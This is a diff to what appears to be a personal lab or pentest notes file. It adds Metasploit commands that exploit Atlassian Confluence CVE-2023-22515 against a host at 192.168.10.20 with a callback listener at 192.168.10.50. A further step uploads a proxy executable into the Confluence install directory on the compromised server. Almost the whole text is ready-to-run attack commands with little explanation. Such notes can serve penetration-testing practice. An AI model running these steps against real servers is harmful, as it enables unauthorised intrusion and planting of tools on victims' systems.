@@ -4,7 +4,13 @@ https://www.youtube.com/watch?v=5cUOgCdfCdI
 
 ## use metasploit for exploit CVE
 
-multi/http/atlassian_confluence_rce_cve_2023_22515
+
+msfconsole
+use multi/http/atlassian_confluence_rce_cve_2023_22515
+set CONFLUENCE_TARGET_ENDPOINT login.action?os_destination=%2Findex.action&permissionViolation=true
+set RHOSTS 192.168.10.20
+set LHOST 192.168.10.50
+
 
 
 upload /opt/proxy.exe "C:\\Program Files\\Atlassian\\Confluence\\proxy.exe"
